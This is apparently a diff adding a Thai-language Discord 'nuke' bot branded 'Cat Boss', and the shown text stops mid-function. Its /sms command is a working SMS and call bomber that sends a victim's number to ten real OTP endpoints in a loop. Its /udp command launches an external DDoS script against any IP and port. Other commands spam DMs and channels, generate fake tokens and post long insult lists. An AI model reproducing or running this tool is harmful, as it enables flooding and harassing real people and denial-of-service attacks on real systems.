@@ -1,0 +1,954 @@
+import importlib
+import subprocess
+import sys
+
+def ensure_package(package_name, import_name=None):
+    """ ตรวจสอบว่ามีโมดูลหรือยัง ถ้าไม่มีจะติดตั้งอัตโนมัติด้วย pip """
+    try:
+        return importlib.import_module(import_name or package_name)
+    except ImportError:
+        print(f"[+] Installing missing package: {package_name} ...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
+        return importlib.import_module(import_name or package_name)
+
+# ====== ติดตั้งและ import อัตโนมัติ ======
+discord = ensure_package("discord.py", "discord")
+asyncio = ensure_package("asyncio")
+random = ensure_package("random")
+platform = ensure_package("platform")
+psutil = ensure_package("psutil")
+time = ensure_package("time")
+os = ensure_package("os")
+sys = ensure_package("sys")
+requests = ensure_package("requests")
+aiohttp = ensure_package("aiohttp")
+datetime_mod = ensure_package("datetime")
+string_mod = ensure_package("string")
+base64_mod = ensure_package("base64")
+subprocess_mod = ensure_package("subprocess")
+
+print("[+] All required modules are ready!")
+
+import discord
+import asyncio
+import random
+import platform
+import psutil
+import time
+import os, sys
+from requests import Session
+import datetime
+import string
+import base64
+import subprocess
+import requests
+import aiohttp
+
+intents = discord.Intents.all()
+intents.message_content = True
+
+banned_users = set()
+xeecida001 = ""
+
+class MyBot(discord.Client):
+    def __init__(self):
+        super().__init__(intents=intents)
+        self.tree = discord.app_commands.CommandTree(self)
+
+    async def setup_hook(self):
+        await self.tree.sync()
+        self.load_banned_users()
+
+    def load_banned_users(self):
+        try:
+            with open("ban_log.txt", "r") as f:
+                for line in f:
+                    uid = line.strip()
+                    if uid.isdigit():
+                        banned_users.add(int(uid))
+        except FileNotFoundError:
+            pass
+
+    def save_banned_user(self, user_id: int):
+        banned_users.add(user_id)
+        with open("ban_log.txt", "a") as f:
+            f.write(f"{user_id}\n")
+
+    def remove_banned_user(self, user_id: int):
+        banned_users.discard(user_id)
+        with open("ban_log.txt", "w") as f:
+            for uid in banned_users:
+                f.write(f"{uid}\n")
+
+bot = MyBot()
+
+@bot.event
+async def on_ready():
+    os.system('cls' if os.name == 'nt' else 'clear') # ล้าง console
+    
+    # ANSI สี
+    GREEN = "\033[92m"
+    YELLOW = "\033[1;33m"
+    RED = "\033[1;31m"
+    PURPLE = "\033[1;35m"
+    CYAN = "\033[1;36m"
+    RESET = "\033[0m"
+
+    # ข้อมูลทั่วไป
+    print(f"{GREEN}║ [~ {bot.user} ~]{RESET}")
+    time.sleep(1)
+    print(f"{GREEN}║ > 18 COMMANDS WORKING STATUS{RESET}")
+    time.sleep(1)
+    print(f"{GREEN}║ > PROJECT NUKE BOT {RESET}|{CYAN} DEV mofalove123{RESET}")
+    time.sleep(1)
+    print(f"{GREEN}║ > DISCORD {RESET}{PURPLE}https://discord.gg/nrmRVzY4{RESET}")
+
+    await bot.change_presence(activity=discord.Streaming(name='🟣🟢🔴 Drak', url='https://discord.gg/nrmRVzY4'))
+
+    voice = 4848484 
+    for guild in bot.guilds:
+        voice_channel = guild.get_channel(voice)
+        if voice_channel and isinstance(voice_channel, discord.VoiceChannel):
+            try:
+                await voice_channel.connect()
+                print(f"{GREEN}║ > {RED}JOIN VC: {voice_channel.name}")
+            except Exception as e:
+                print(f"{GREEN}║ > {RED}ERROR: {e}")
+
+    LOG_CHANNEL_ID = 488428484848
+    channel = bot.get_channel(LOG_CHANNEL_ID)
+    if channel is not None:
+        embed = discord.Embed(
+            title="START HOST",
+            description=f"`{bot.user}` STARTING\n\n`+ Add Command`",
+            color=discord.Color.green(),
+        )
+        embed.set_footer(text="© 2025 COPYRIGH 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED", icon_url=bot.user.avatar.url if bot.user.avatar else None)
+        embed.set_thumbnail(url=bot.user.display_avatar.url)
+        await channel.send(embed=embed)
+    else:
+        print(f"[Warning] ไม่พบช่องทาง (channel) ID: {LOG_CHANNEL_ID}")
+
+async def is_banned(interaction: discord.Interaction):
+    if interaction.user.id in banned_users:
+        await interaction.response.send_message("# มึงใช้ไม่ได้ครับ อย่าเอ๋อ โดนแบล็คลิตลิตไง https://discord.gg/nrmRVzY4 เข้าดิสมาขอปลดแบล็คลิต", ephemeral=True)
+        return True
+    return False
+
+def api1(phone):
+    requests.post("https://www.theconcert.com/rest/request-otp", json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4}, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
+
+def api2(phone):
+    send = Session()
+    send.headers.update({"User-Agent" : "Mozilla/5.0"})
+    send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data=f"st.r.phone=+66{phone[1:]}")
+    send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI", data="st.r.fieldAcceptCallUIButton=Call")
+
+def api3(phone):
+    requests.post("https://api.zaapi.co/api/store/auth/otp/login", json={"phoneNumber":f"+66{phone[1:]}","namespace":"zaapi-buyers"})
+
+def api4(phone):
+    requests.post("https://icq.com/smscode/login/ru", headers={"User-Agent": "Mozilla"}, data=f"msisdn=66{phone[1:]}")
+
+def api5(phone):
+    requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn", headers={"User-Agent": "Mozilla"}, data=f"phoneno={phone}&retrycount=0")
+
+def api6(phone):
+    requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
+
+def api7(phone):
+    requests.post("http://b226.com/x/code", data={f"phone":phone})
+
+def api8(phone):
+    requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
+
+def api9(phone):
+    requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}")
+
+def api10(phone):
+    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": phone,"password":"Az123456","name":"Test","provinceCode":"10","districtCode":"1001","subdistrictCode":"100101","zipcode":"10200","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
+
+api_list = [api1, api2, api3, api4, api5, api6, api7, api8, api9, api10]
+
+@bot.tree.command(name="setnuke", description="กันโดน 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 บอท")
+async def setnuke(interaction: discord.Interaction, channel_id: str):
+    if await is_banned(interaction):
+        return
+
+    user = interaction.user
+    is_admin = user.guild_permissions.administrator
+    is_allowed_name = f"{user.name}#{user.discriminator}" == xeecida001
+
+    if not is_admin and not is_allowed_name:
+        await interaction.response.send_message("มึงไม่ใช้แอดมินครับเอ๋อ", ephemeral=True)
+        return
+
+    if not channel_id.isdigit():
+        await interaction.response.send_message("ไอดีห้องให้ถูก", ephemeral=True)
+        return
+
+    channel = interaction.guild.get_channel(int(channel_id))
+    if channel is None or not isinstance(channel, discord.TextChannel):
+        await interaction.response.send_message("ไม่มีช่องที่กูเห็นว่ะ", ephemeral=True)
+        return
+
+    overwrite = channel.overwrites_for(interaction.guild.default_role)
+    overwrite.send_messages = True
+    overwrite.create_public_threads = False
+    overwrite.create_private_threads = False
+    overwrite.use_application_commands = False
+    overwrite.attach_files = False
+    overwrite.embed_links = False
+
+    try:
+        await channel.set_permissions(interaction.guild.default_role, overwrite=overwrite)
+        await channel.edit(slowmode_delay=5)
+        await interaction.response.send_message(f"ระบบได้ตั้งแล้ววควายย <#{channel.id}>", ephemeral=False)
+    except Exception as e:
+        await interaction.response.send_message(f"Error ของนี่ไอส้สแก้ด่วนเลย {e}", ephemeral=True)
+
+@bot.tree.command(name="sms", description="SMS")
+async def sms(interaction: discord.Interaction, phone: str, amount: int):
+    if not phone.isdigit() or not phone.startswith("0") or len(phone) != 10:
+        await interaction.response.send_message("# ใส่เบอร์ให้ถูกดิ 10หลักอ่ะควายย", ephemeral=True)
+        return
+
+    if amount > 10 or amount < 1:
+        await interaction.response.send_message("1 - 10 เท่านั้นไอโง่", ephemeral=True)
+        return
+
+    await interaction.response.send_message(f"# ยิงไปแล้วรอรับ SMS เลยไอสัส `{phone}` จำนวน `{amount}`", ephemeral=True)
+
+    for i in range(amount):
+        for api in api_list:
+            try:
+                api(phone)
+            except:
+                continue
+
+    await interaction.followup.send(f"# ยิงไปแล้วรอรับ SMS เลยไอสัส `{phone}` จำนวน `{amount}`", ephemeral=True)
+
+@bot.tree.command(name="nuke", description="nuke")
+async def ยิงดิสโนยศ(interaction: discord.Interaction, message: str):
+    if await is_banned(interaction):
+        return
+
+    await interaction.response.send_message(f"╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+    await interaction.followup.send(message)
+
+@bot.tree.command(name="xeecidanuke", description="nuke 15")
+async def ยิงดิสโนยศหลายรอบ(interaction: discord.Interaction, message: str, amount: int):
+    if await is_banned(interaction):
+        return
+
+    if amount > 16:
+        await interaction.response.send_message("# จำนวน 15 ควาย", ephemeral=True)
+        return
+
+    await interaction.response.send_message(f"╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+    for _ in range(amount):
+        await interaction.followup.send(message)
+
+@bot.tree.command(name="nukeall", description="nuke 10")
+async def nukeall(interaction: discord.Interaction, message: str, amount: int):
+    if await is_banned(interaction):
+        return
+
+    if amount > 11:
+        await interaction.response.send_message("# จำนวน 10 ควาย", ephemeral=True)
+        return
+
+    await interaction.response.send_message(f"╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+    for _ in range(amount):
+        await interaction.followup.send(message)
+
+@bot.tree.command(name="block", description="ban")
+async def แบล็คลิต(interaction: discord.Interaction, user_id: str):
+    full_name = interaction.user.name
+    if full_name not in xeecida001:
+        await interaction.response.send_message("ไม่ใช่คนทำบอท อย่าเสือกใช้อันนี้", ephemeral=True)
+        return
+
+    if not user_id.isdigit():
+        await interaction.response.send_message("# ID ดิ", ephemeral=True)
+        return
+
+    uid = int(user_id)
+    if uid in banned_users:
+        await interaction.response.send_message("# แบนอยู่แล้วไอควาย", ephemeral=True)
+        return
+
+    bot.save_banned_user(uid)
+
+    with open("ban_action_log.txt", "a") as log_file:
+        log_file.write(f"ID {uid} โดนแบน โดย {full_name}\n")
+
+    user = await bot.fetch_user(uid)
+    embed = discord.Embed(
+        title="Blacklist",
+        description=(
+            f"**ID:** `{uid}`\n"
+            f"**คนโดนแบล็คลิต:** `{user.name}#{user.discriminator}`\n"
+            f"**Blacklist Admin:** จาก `{full_name}`"
+        ),
+        color=discord.Color.red()
+    )
+    embed.set_footer(
+        text="© 2025 COPYRIGHT 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED",
+        icon_url=bot.user.avatar.url if bot.user.avatar else None
+    )
+
+    channel = bot.get_channel(1378888995202662411)
+    if channel:
+        await channel.send(embed=embed)
+
+    await interaction.response.send_message(f"# แบน {uid} แล้วนะไอ่สัส", ephemeral=True)
+
+@bot.tree.command(name="unblock", description="unban")
+async def ยกเลิกแบล็คลิต(interaction: discord.Interaction, user_id: str):
+    full_name = interaction.user.name
+    if full_name not in xeecida001:
+        await interaction.response.send_message("# ไม่ใช่เจ้าของบอท", ephemeral=True)
+        return
+
+    if not user_id.isdigit():
+        await interaction.response.send_message("# ID ดิ เอาให้ตรงนะ", ephemeral=True)
+        return
+
+    uid = int(user_id)
+    if uid not in banned_users:
+        await interaction.response.send_message("# ไม่ได้โดนแบน จะปลดทำเหี้ยไร", ephemeral=True)
+        return
+
+    bot.remove_banned_user(uid)
+
+    with open("ban_action_log.txt", "a") as log_file:
+        log_file.write(f"ID {uid} ถูกปลดแบน โดย {full_name}\n")
+
+    await interaction.response.send_message(f"# ปลดแบน {uid} แล้วนะ", ephemeral=True)
+
+@bot.tree.command(name="nukedm", description="nuke dm")
+async def ส่งdm(interaction: discord.Interaction, user_id: str, message: str, amount: int):
+    if await is_banned(interaction):
+        return
+
+    if not user_id.isdigit():
+        await interaction.response.send_message("# กรุณาใส่ User ID ที่เป็นตัวเลข", ephemeral=True)
+        return
+
+    if amount > 50:
+        await interaction.response.send_message("# ยิงไม่เกิน 50 ควายยยยย!!", ephemeral=True)
+        return
+
+    try:
+        user = await bot.fetch_user(int(user_id))
+    except discord.NotFound:
+        await interaction.response.send_message("# ใส่ถูกมั้ย ใส่ดีๆดิว่ะ", ephemeral=True)
+        return
+    except discord.HTTPException:
+        await interaction.response.send_message("# หาไม่เจอว่ะโทษที", ephemeral=True)
+        return
+
+    success = 0
+    fail = 0
+
+    for _ in range(amount):
+        try:
+            await user.send(message)
+            success += 1
+        except:
+            fail += 1
+            break
+
+    await interaction.response.send_message(
+        f"╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส",
+        ephemeral=True
+    )
+
+@bot.tree.command(name="hackimg", description="img")
+async def ดึงรูปโปรไฟล์(interaction: discord.Interaction, user_id: str):
+    if await is_banned(interaction):
+        return
+
+    if not user_id.isdigit():
+        await interaction.response.send_message("ID ดิเอ๋อไร", ephemeral=True)
+        return
+
+    try:
+        user = await bot.fetch_user(int(user_id))
+    except discord.NotFound:
+        await interaction.response.send_message("ไม่พบคร้าบบ id นี้", ephemeral=True)
+        return
+    except discord.HTTPException:
+        await interaction.response.send_message("ดึงไม่ได้ว่ะโทษที", ephemeral=True)
+        return
+
+    embed = discord.Embed(
+        title=f"HACK IMAGE: {user.name}",
+        description=f"User ID: `{user.id}`",
+        color=discord.Color.red()
+    )
+    embed.set_image(url=user.display_avatar.url)
+    embed.set_footer(text="© 2025 COPYRIGH 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED", icon_url=bot.user.avatar.url if bot.user.avatar else None)
+
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="nukecat", description="catimg")
+async def ยิงแมวมึน(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    blurry_cat_urls = [
+        "https://tenor.com/view/meme-cat-explosion-gif-17905284344545073180",
+        "https://tenor.com/view/insanity-popolo-koko-snail-sweep-gif-10300625954161930026",
+        "https://tenor.com/view/vorparian-cat-cat-crying-cat-screaming-alien-cat-gif-4185291664303275819",
+        "https://tenor.com/view/eac-conspiracy-vixen-cat-happy-gif-145694352558327638",
+        "https://tenor.com/view/cat-cute-cat-cat-dance-cute-cat-dance-ai-cat-gif-15064057413633942575",
+        "https://cdn.discordapp.com/attachments/1378392591657205893/1378724300038865037/29_20250601201724.png?ex=683da490&is=683c5310&hm=f9348949ce405e72210d709b3841262f48be79e5c31a54951329aa1f0e3b48b7&",
+        "https://cdn.discordapp.com/attachments/1378392591657205893/1378722826680275125/fd872a1c3b81d1c9020b0267f8b313de_1.jpg?ex=683da331&is=683c51b1&hm=2041acc4f897ba2964bbbaddc4a6d52a8a0d5d3b738ebd5ca9af1cf0900166cc&",
+    ]
+
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+    await interaction.followup.send(random.choice(blurry_cat_urls))
+
+@bot.tree.command(name="discordhack", description="discordhack")
+async def ข้อมูลแฮก(interaction: discord.Interaction, user_id: str):
+    if await is_banned(interaction):
+        return
+
+    if not user_id.isdigit():
+        await interaction.response.send_message("# ID มั่วๆอะไรว่ะ ใส่เลขมา", ephemeral=True)
+        return
+
+    try:
+        user = await bot.fetch_user(int(user_id))
+    except discord.NotFound:
+        await interaction.response.send_message("# หาไม่เจอเว้ยย ID ไม่มีในระบบ", ephemeral=True)
+        return
+    except discord.HTTPException:
+        await interaction.response.send_message("# ผิดพลาดเรียกข้อมูล", ephemeral=True)
+        return
+
+    embed = discord.Embed(
+        title="Discord Info",
+        description=f"user <@{user.id}>",
+        color=discord.Color.green()
+    )
+    embed.set_thumbnail(url=user.display_avatar.url)
+    embed.add_field(name="`👤` Username", value=f"{user.name}", inline=True)
+    embed.add_field(name="`🆔` User ID", value=f"{user.id}", inline=True)
+    embed.add_field(name="`🖼️` Avatar", value=f"[คลิกดูรูป]({user.display_avatar.url})", inline=False)
+    embed.add_field(name="`🤖` user/bot", value="`✅` บอท" if user.bot else "`❌` คน", inline=True)
+    embed.add_field(name="`📆 `สร้างดิสตอดไหนว่ะ", value=f"<t:{int(user.created_at.timestamp())}:F>", inline=False)
+
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="pingbot", description="xeecida")
+async def pingbot(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    start_time = time.time()
+    await interaction.response.defer(ephemeral=True)
+    end_time = time.time()
+
+    latency_ms = round((end_time - start_time) * 1000)
+    cpu = platform.processor()
+    system = platform.system()
+    release = platform.release()
+    ram = psutil.virtual_memory().total / (1024 ** 3)
+    ram_used = psutil.virtual_memory().used / (1024 ** 3)
+    cpu_usage = psutil.cpu_percent(interval=1)
+
+    embed = discord.Embed(
+        title="BOT STATUS",
+        color=discord.Color.blue()
+    )
+    embed.add_field(name="`📶` Pingbot", value=f"`[{latency_ms}] ms`", inline=False)
+    embed.add_field(name="`🖥️` ระบบที่รัน", value=f"[{system} {release}]", inline=True)
+    embed.add_field(name="`⚙️` CPU", value=cpu or "[ไม่ระบุ]", inline=True)
+    embed.add_field(name="`🔥` การใช้ CPU", value=f"[{cpu_usage}]%", inline=True)
+    embed.add_field(name="`💾` RAM", value=f"[{ram_used:.2f}] / [{ram:.2f}] GB", inline=True)
+    embed.add_field(name="`👑` DEV", value="`[Drak]`", inline=False)
+    embed.set_footer(text="© 2025 COPYRIGH 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED", icon_url=bot.user.avatar.url if bot.user.avatar else None)
+
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="phone", description="phonenet")
+async def ตรวจสอบเครือข่าย(interaction: discord.Interaction, phone_number: str):
+    if await is_banned(interaction):
+        return
+
+    if not phone_number.isdigit() or len(phone_number) != 10:
+        await interaction.response.send_message("# 10 หลักไอควายย", ephemeral=True)
+        return
+
+    await interaction.response.send_message(
+        f"เพื่อเช็คเครือข่ายเบอร์ {phone_number} กดรหัส USSD ต่อไปนี้บนPHONE:\n"
+        f"- AIS: `*727*{phone_number}#`\n"
+        f"- DTAC: `*102*{phone_number}#` หรือ `*812*{phone_number}#`\n"
+        f"- TrueMove H: `*933*{phone_number}#`",
+        ephemeral=True
+    )
+
+def generate_fake_token():
+    uid = ''.join(random.choices(string.digits, k=18))
+    part1 = base64.b64encode(uid.encode()).decode().replace("=", "") # base64 ของ user_id
+    part2 = ''.join(random.choices(string.ascii_letters + string.digits, k=6)) # ประมาณกลาง token
+    part3 = ''.join(random.choices(string.ascii_letters + string.digits + "_-", k=27)) # ปลาย token
+    return f"{part1}.{part2}.{part3}"
+
+@bot.tree.command(name="gentoken", description="TOKENGEN")
+async def สุ่มโทเคน(interaction: discord.Interaction, amount: int):
+    if await is_banned(interaction):
+        return
+
+    if amount > 5 or amount < 1:
+        await interaction.response.send_message("# กรอกจำนวน 1 - 5 เท่านั้น ควายยยยโง่", ephemeral=True)
+        return
+
+    tokens = [generate_fake_token() for _ in range(amount)]
+    await interaction.response.send_message("**TOKEN GEN**\n" + "\n".join(tokens), ephemeral=True)
+
+insults = [
+    "# โง่ยังจะโชว์อีก", "# หน้าหมาเกินไปละ", "# คิดได้แค่นี้?", "# หัดใช้สมองบ้าง",
+    "# ไปเรียนใหม่มั้ย", "# สมองมีไว้แค่คั่นหู", "# พูดอะไรออกมาดูตัวเองก่อน", "# ขยะสังคม",
+    "# เบียวเกินไปปะ", "# เอ๋อแดก", "# โคตรจะไร้สาระ", "# ดูโง่แบบจริงจัง",
+    "# อย่างกับ NPC", "# ไม่ไหวจะเคลียร์", "# อินดี้เกินไประวังล้ม", "# เล่นตัวเกินแมว",
+    "# น่าสงสารว่ะ", "# ไม่มีใครรักเหรอ", "# เหมือนจะฉลาดนะ", "# เก่งแต่ในเน็ต",
+    "# ขี้เกียจเถียงกับคนแบบนี้", "# ฟังแล้วปวดหัว", "# เม้นต์แบบไม่มีสมอง", "# กดข้ามไม่ได้เหรอ",
+    "# ไปรักษามั้ย", "# เอาเวลาไปทำประโยชน์เถอะ", "# กากมาก", "# โคตรมั่ว",
+    "# ตรรกะป่วย", "# ขาดความอบอุ่นรึไง"
+]
+
+@bot.tree.command(name="nukefunk", description="nukefunk")
+async def nukefunk(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+
+    for _ in range(5):
+        message = random.choice(insults)
+        await interaction.followup.send(message)
+
+ss = [
+    "# โถไอ่...........เอ้ย ไอ่ชาติคางคก ไอ่รกแผ่นดิน ไอ่ลิ้นสองแฉก ไอ่แหวกกอหญ้า ไอ่บ้าห้าร้อยจำพวก ไอ่ปลวกใต้หลังคา ไอ่หน้าปลาจวดไอ่กรวดท้องร่อง ไอ่บ้องกัญชา ไอ่ปลาไม่กินเบ็ด ไอ่เห็ดสามสี ไอ่ชะนีสามรส ไอ่ตดเสียงดัง ไอ่ทั่งตีเหล็ก ไอ่เด็กปัญญาอ่อน ไอ่นอนเกา ไอ่กะโหลกซออู้ ไอ่กู้ไม่กลับ ไอ่ตับย่างเกลือ ไอ่เชื้ออหิวาต์ ไอ่ม้าขี้ครอก ไอ่หอกขึ้นสนิม ไอ่ขิมสายขาด ไอ่ชาติสุนัข ไอ่ตะหวักตะบวย ไอ่กล้วยตากแห้ง ไอ่แกงฟักทอง ไอ่คลองเจ็ดคด ไอ่ชะมดเช็ด ไอ่เกล็ดเต็มตัว ไอ่มั่วไม่รู้จบ ไอ่ศพขึ้นอืด ไอ่หืดขึ้นคอ ไอ่ปลาหมอแถกเหงือก ไอ่เผือกรมควัน ไอ่มันสำปะหลัง ไอ่โกดังเก็บศพ ไอ่กบผัดเผ็ด ไอ่เป็ดทอดกระเทียม ไอ่เฮี่ยมตกม้า ไอ่หมาเกาเรื้อน ไอ่เกลื้อนขึ้นหลัง ไอ่ถังหมักขี้ ไอ่ดีไม่ห่างเหิน ไอ่เดินไม่ดูทาง ไอ่ก้างติดคอ ไอ่หม้อก้นทะลุ ไอ่กระชุก้นรั่ว ไอ่หัวองคชาต ไอ่กระจาดปลาแห้ง ไอ่แทงไม่เข้ารู ไอ่ปลาทูแม่กลอง ไอ่สององคต ไอ่หดหัวในกระดอง ไอ่สมองเท่าเมล็ดถั่ว ไอ่ตัวกินไก่ ไอ้ใจปลาซิว ไอ่หิวตลอดศก ไอ่ซกมกเป็นนิจสิน ไอ่หินใต้บาดาล ไอ่สันดานนักเลง ไอ่เพลงผิดคีย์ ไอ่สีทาบ้าน ไอ่จานเปื้อนคราบ ไอ่แมลงสาบทรงเครื่อง ไอ่เปลืองข้าวสุก ไอ่กระปุกตังไฉ่ ไอ่ไหปลา ไอ้คนแบกกุ้ง ไอ้ถุงข้าวเปลือก ไอ่เสือกทุกงาน"
+]
+
+@bot.tree.command(name="nukefunk1", description="ด่ายาวววววววว")
+async def nukefunk1(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+
+    for _ in range(5):
+        message = random.choice(ss)
+        await interaction.followup.send(message)
+
+@bot.tree.command(name="lag", description="lag")
+async def lag(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    emojis = [
+        "😂", "🤣", "😅", "😍", "🔥", "💥", "💀", "🤡", "👻", "😈", "💩", "🤖",
+        "😎", "👽", "🎉", "🎊", "🍕", "🍔", "🍟", "🍺", "🌈", "🌪️", "⚡", "💫",
+        "⭐", "✨", "🎃", "🎈", "🎵", "🎶", "🧟", "🦄", "🐱", "🐶", "🐸", "🐵",
+        "🐼", "🐨", "🐯", "🦁"
+    ]
+
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+
+    for _ in range(5):
+        # สุ่มจำนวนอิโมจิในข้อความยาวๆ เช่น 30-50 ตัว
+        length = random.randint(500, 1000)
+        message = ''.join(random.choices(emojis, k=length))
+        await interaction.followup.send(message)
+
+@bot.tree.command(name="udp", description="UDP")
+async def udp(interaction: discord.Interaction, ip: str, port: int, thread: int, time: int):
+    if await is_banned(interaction):
+        return
+
+    # Validate IP
+    import ipaddress
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        await interaction.response.send_message("IP ผิด เอ๋อ", ephemeral=True)
+        return
+
+    # Validate port
+    if not (1 <= port <= 65535):
+        await interaction.response.send_message("มึงใส่ถูกมั้ยว่ะ พอต อ่ะควาย", ephemeral=True)
+        return
+
+    # Validate thread
+    if thread > 60 or thread < 1:
+        await interaction.response.send_message("60 เท่านั้นควายยห้ามเกิน", ephemeral=True)
+        return
+
+    # Validate time
+    if time > 100 or time < 1:
+        await interaction.response.send_message("ห้ามเกิน 100 ควายย", ephemeral=True)
+        return
+
+    # ตัวอย่างการตอบกลับ
+    embed = discord.Embed(
+        title="UDP",
+        color=discord.Color.orange()
+    )
+    embed.add_field(name="IP", value=ip, inline=True)
+    embed.add_field(name="Port", value=str(port), inline=True)
+    embed.add_field(name="Threads", value=str(thread), inline=True)
+    embed.add_field(name="Time", value=f"[{time}] วินาที", inline=True)
+    embed.set_footer(text="© 2025 COPYRIGH 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED", icon_url=bot.user.avatar.url if bot.user.avatar else None)
+
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    subprocess.run(["python3", "DDoSXeecida.py", ip, str(port), str(thread), str(time)])
+
+@bot.tree.command(name="nukeembed5", description="nukeembed5")
+async def nuke_embed(interaction: discord.Interaction, message: str):
+    if await is_banned(interaction):
+        return
+
+    embed = discord.Embed(
+        title="โดนแล้วววววววควายย",
+        description=f"{message}\n\n`https://discord.gg/nrmRVzY4`\n`𝑪𝒂𝒕 𝑩𝒐𝒔𝒔`",
+        color=discord.Color.red()
+    )
+    embed.set_image(url="https://cdn.discordapp.com/attachments/1350862294309011476/1379142447153811697/7d33c243485aa0dd8dd0d6ad5d0215db.gif")
+    embed.set_footer(text="© 2025 COPYRIGH 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED", icon_url=bot.user.avatar.url if bot.user.avatar else None)
+
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+    for _ in range(5):
+        await interaction.followup.send(embed=embed)
+
+@bot.tree.command(name="nukeembed1", description="nukeembed1")
+async def nuke_embed1(interaction: discord.Interaction, message: str):
+    if await is_banned(interaction):
+        return
+
+    embed = discord.Embed(
+        title="โดนแล้วววววววควายย",
+        description=f"{message}\n\n`https://discord.gg/nrmRVzY4`\n`𝑪𝒂𝒕 𝑩𝒐𝒔𝒔`",
+        color=discord.Color.red()
+    )
+    embed.set_image(url="https://cdn.discordapp.com/attachments/1350862294309011476/1379142447153811697/7d33c243485aa0dd8dd0d6ad5d0215db.gif")
+    embed.set_footer(text="© 2025 COPYRIGH 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED", icon_url=bot.user.avatar.url if bot.user.avatar else None)
+
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+    for _ in range(1):
